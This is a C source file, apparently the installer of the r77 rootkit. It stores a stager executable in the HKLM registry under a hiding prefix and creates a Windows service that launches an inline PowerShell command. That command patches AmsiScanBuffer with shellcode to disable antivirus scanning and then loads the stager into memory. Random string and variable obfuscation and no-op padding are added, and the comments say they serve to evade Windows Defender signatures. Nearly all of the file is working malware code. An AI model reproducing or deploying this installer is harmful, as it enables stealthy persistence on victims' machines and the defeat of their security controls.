#include "Install.h"
#include "resource.h"
#include "r77def.h"
#include "r77win.h"
#include <wchar.h>
#include <Shlwapi.h>

int main()
{
	// Get stager executable from resources.
	LPBYTE stager;
	DWORD stagerSize;
	if (!GetResource(IDR_STAGER, "EXE", &stager, &stagerSize)) return 0;

	// Write stager executable to registry.
	// This C# executable is compiled with AnyCPU and can be run by both 32-bit and 64-bit powershell.
	// The target framework is 3.5, but it will run, even if .NET 4.x is installed and .NET 3.5 isn't.

	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	// This powershell command loads the stager from the registry and executes it in memory using Assembly.Load().EntryPoint.Invoke()
	// The C# binary will proceed with starting the r77 service using reflective DLL injection.
	// The powershell command is purely inline and doesn't require a ps1 file.

	LPWSTR startupCommand = GetStartupCommand();

	DeleteWindowsService(R77_SERVICE_NAME);
	CreateWindowsService(R77_SERVICE_NAME, startupCommand);

	return 0;
}

LPWSTR GetStartupCommand()
{
	// Powershell inline command to be invoked using powershell.exe "..."

	PWCHAR command = NEW_ARRAY(WCHAR, 16384);

	// A Windows Service does not start when using powershell.exe directly, but cmd.exe wrapping powershell.exe works.
	StrCpyW(command, L"cmd.exe /c \"powershell.exe -Command \"\"");

	// AMSI bypass:
	// [Reflection.Assembly]::Load triggers AMSI and the byte[] with Stager.exe is passed to AV for analysis.
	// AMSI must be disabled for the entire process, because both powershell and .NET itself implement AMSI.

	// AMSI is only supported on Windows 10; AMSI bypass not required for Windows 7.
	if (IsAtLeastWindows10())
	{
		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
		StrCatW(
			command,
			// Function to create a Delegate from an IntPtr
			L"function Local:Get-Delegate{"
			L"Param("
			L"[OutputType([Type])]"
			L"[Parameter(Position=0)][Type[]]$ParameterTypes,"
			L"[Parameter(Position=1)][Type]$ReturnType"
			L")"
			L"$TypeBuilder=[AppDomain]::CurrentDomain"
			L".DefineDynamicAssembly((New-Object Reflection.AssemblyName(`ReflectedDelegate`)),[Reflection.Emit.AssemblyBuilderAccess]::Run)"
			L".DefineDynamicModule(`InMemoryModule`,$False)"
			L".DefineType(`MyDelegateType`,`Class,Public,Sealed,AnsiClass,AutoClass`,[MulticastDelegate]);"
			L"$TypeBuilder.DefineConstructor(`RTSpecialName,HideBySig,Public`,[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
			L"$TypeBuilder.DefineMethod(`Invoke`,`Public,HideBySig,NewSlot,Virtual`,$ReturnType,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
			L"Write-Output $TypeBuilder.CreateType();"
			L"}"

			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()^|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
			L".GetType(`Microsoft.Win32.UnsafeNativeMethods`);"
			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags](`Public,Static`),$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"

			// Create delegate types
			L"$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);"
			L"$VirtualProtectDelegate=Get-Delegate @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())([Bool]);"

			// Get DLL and function pointers
			L"$Kernel32Ptr=$NativeMethods.GetMethod(`GetModuleHandle`).Invoke($Null,@([Object](`kernel32.dll`)));"
			L"$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`LoadLibraryA`)));"
			L"$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`VirtualProtect`)));"
			L"$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke(`amsi.dll`);"

			// Get address of AmsiScanBuffer
			L"$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object](`AmsiScanBuffer`)));"

			// VirtualProtect PAGE_READWRITE
			L"$OldProtect=0;"
			L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,4,[ref]$OldProtect);"
		);

		// Overwrite AmsiScanBuffer function with shellcode to return AMSI_RESULT_CLEAN.
		// Intermingle shellcode with dummy (no-op like) instructions to evade Windows Defender detection of AmsiScanBuffer overwrites.
		if (Is64BitOperatingSystem())
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c3				ret
			DWORD shellCodeSize = 6;

			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L",");
			WriteShellCodeBytes(command, "\xb8\x57\x00\x07\x80", 5);
			StrCatW(command, L",");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L",");
			WriteShellCodeBytes(command, "\xc3", 1);
			StrCatW(command, L",");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L"),0,$AmsiScanBufferPtr,");
			WriteObfuscatedNumber(command, shellCodeSize);
			StrCatW(command, L");");
		}
		else
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c2 18 00			ret		0x18
			DWORD shellCodeSize = 8;

			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L",");
			WriteShellCodeBytes(command, "\xb8\x57\x00\x07\x80", 5);
			StrCatW(command, L",");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L",");
			WriteShellCodeBytes(command, "\xc2\x18\x00", 3);
			StrCatW(command, L",");
			shellCodeSize += WriteDummyShellCodeBytes(command);
			StrCatW(command, L"),0,$AmsiScanBufferPtr,");
			WriteObfuscatedNumber(command, shellCodeSize);
			StrCatW(command, L");");
		}

		// VirtualProtect PAGE_EXECUTE_READ
		StrCatW(command, L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,0x20,[ref]$OldProtect);");
	}

	// Load Stager.exe from registry and invoke
	StrCatW(
		command,
		L"[Reflection.Assembly]::Load"
		L"("
		L"[Microsoft.Win32.Registry]::LocalMachine"
		L".OpenSubkey(`SOFTWARE`)"
		L".GetValue(`" HIDE_PREFIX L"stager`)"
		L")"
		L".EntryPoint"
		L".Invoke($Null,$Null)"
	);

	StrCatW(command, L"\"\"\"");

	// Replace string literals that are marked with `thestring`.
	ObfuscateStringLiterals(command);

	// Obfuscate all variable names with random strings.
	ObfuscateVariable(command, L"Get-Delegate");
	ObfuscateVariable(command, L"ParameterTypes");
	ObfuscateVariable(command, L"ReturnType");
	ObfuscateVariable(command, L"TypeBuilder");
	ObfuscateVariable(command, L"NativeMethods");
	ObfuscateVariable(command, L"GetProcAddress");
	ObfuscateVariable(command, L"LoadLibraryDelegate");
	ObfuscateVariable(command, L"VirtualProtectDelegate");
	ObfuscateVariable(command, L"Kernel32Ptr");
	ObfuscateVariable(command, L"LoadLibraryPtr");
	ObfuscateVariable(command, L"VirtualProtectPtr");
	ObfuscateVariable(command, L"AmsiPtr");
	ObfuscateVariable(command, L"AmsiScanBufferPtr");
	ObfuscateVariable(command, L"OldProtect");

	return command;
}
VOID ObfuscateVariable(LPWSTR command, LPCWSTR variableName)
{
	DWORD length = lstrlenW(variableName);
	WCHAR newName[100];

	// Replace all ocurrences of a specified variable name with a randomized string of the same length.
	if (GetRandomString(newName, length))
	{
		for (LPWSTR ocurrence; ocurrence = StrStrIW(command, variableName);)
		{
			i_wmemcpy(ocurrence, newName, length);
		}
	}
}
VOID ObfuscateStringLiterals(LPWSTR command)
{
	// Replace all string literals like
	// `thestring`
	// with something like
	// 't'+[Char]123+[Char]45+'s' ...

	// Polymorphic modifications of strings is required, because something static like
	// 'ams'+'i.dll'
	// will eventually end up in a list of known signatures.

	PWCHAR newCommand = NEW_ARRAY(WCHAR, 16384);
	i_wmemset(newCommand, 0, 16384);

	LPBYTE random = NEW_ARRAY(BYTE, 16384);
	if (!GetRandomBytes(random, 16384)) return;

	LPWSTR commandPtr = command;
	LPBYTE randomPtr = random;

	for (LPWSTR beginQuote; beginQuote = StrChrW(commandPtr, L'`');)
	{
		LPWSTR endQuote = StrChrW(&beginQuote[1], L'`');
		DWORD textLength = beginQuote - commandPtr;
		DWORD stringLength = endQuote - beginQuote - 1;

		//  beginQuote   endQuote
		//         |        |
		//         v        v
		// .Invoke(`amsi.dll`);
		// ^------^              <-- textLength
		//          ^------^     <-- stringLength

		// Append what's before the beginning quote.
		StrNCatW(newCommand, commandPtr, textLength + 1);

		// Append beginning quote.
		StrCatW(newCommand, L"'");

		// Append each character using a different obfuscation technique.
		for (DWORD i = 0; i < stringLength; i++)
		{
			WCHAR c = beginQuote[i + 1];
			WCHAR charNumber[10];
			Int32ToStrW(c, charNumber);

			WCHAR obfuscatedChar[20];
			i_wmemset(obfuscatedChar, 0, 20);

			// Randomly choose an obfuscation technique.
			switch ((*randomPtr++) & 3)
			{
				case 0:
					// Put char as literal
					obfuscatedChar[0] = c;
					break;
				case 1:
					// Put char as '+'x'+'
					StrCatW(obfuscatedChar, L"'+'");
					StrNCatW(obfuscatedChar, &c, 2);
					StrCatW(obfuscatedChar, L"'+'");
					break;
				case 2:
				case 3:
					// Put char as '+[Char](123)+'
					StrCatW(obfuscatedChar, L"'+[Char](");
					StrCatW(obfuscatedChar, charNumber);
					StrCatW(obfuscatedChar, L")+'");
					break;
			}

			// Append obfuscated version of this char.
			StrCatW(newCommand, obfuscatedChar);
		}

		// Append ending quote.
		StrCatW(newCommand, L"'");

		commandPtr += textLength + stringLength + 2;
	}

	// Append remaining string after the last quoted string.
	StrCatW(newCommand, commandPtr);

	StrCpyW(command, newCommand);
	FREE(newCommand);
	FREE(random);
}
VOID WriteShellCodeBytes(LPWSTR command, LPCBYTE shellCode, DWORD size)
{
	// Write shellcode bytes:
	//  - Each byte is obfuscated using a simple addition or subtraction.
	//    e.g.: 0xab -> [Byte](0x12+0x99)

	for (DWORD i = 0; i < size; i++)
	{
		StrCatW(command, L"[Byte](");
		WriteObfuscatedNumber(command, shellCode[i]);
		StrCatW(command, L")");

		if (i < size - 1)
		{
			StrCatW(command, L",");
		}
	}
}
DWORD WriteDummyShellCodeBytes(LPWSTR command)
{
	BYTE rand[1];
	GetRandomBytes(rand, 1);

	LPCSTR shellCode = "";
	DWORD size = 0;

	switch (rand[0] & 7)
	{
		// These shellcodes are equal in x64 and x86 mode.
		case 0:
			shellCode = "\x89\xc0"; // mov eax, eax
			size = 2;
			break;
		case 1:
			shellCode = "\x89\xdb"; // mov ebx, ebx
			size = 2;
			break;
		case 2:
			shellCode = "\x89\xc9"; // mov ecx, ecx
			size = 2;
			break;
		case 3:
			shellCode = "\x89\xd2"; // mov edx, edx
			size = 2;
			break;
		case 4:
			shellCode = "\x83\xc0\x00"; // add eax, 0
			size = 3;
			break;
		case 5:
			shellCode = "\x83\xeb\x00"; // sub ebx, 0
			size = 3;
			break;
		case 6:
			shellCode = "\x83\xc1\x00"; // add ecx, 0
			size = 3;
			break;
		case 7:
			shellCode = "\x83\xea\x00"; // sub edx, 0
			size = 3;
			break;
	}

	WriteShellCodeBytes(command, shellCode, size);
	return size;
}
VOID WriteObfuscatedNumber(LPWSTR command, DWORD number)
{
	BYTE rand[1];
	GetRandomBytes(rand, 1);

	INT a = rand[0];
	INT b = number - a;

	WCHAR buffer[10];
	StrCatW(command, Int32ToStrW(a, buffer));
	StrCatW(command, b >= 0 ? L"+" : L"-");
	StrCatW(command, Int32ToStrW(b > 0 ? b : -b, buffer));
}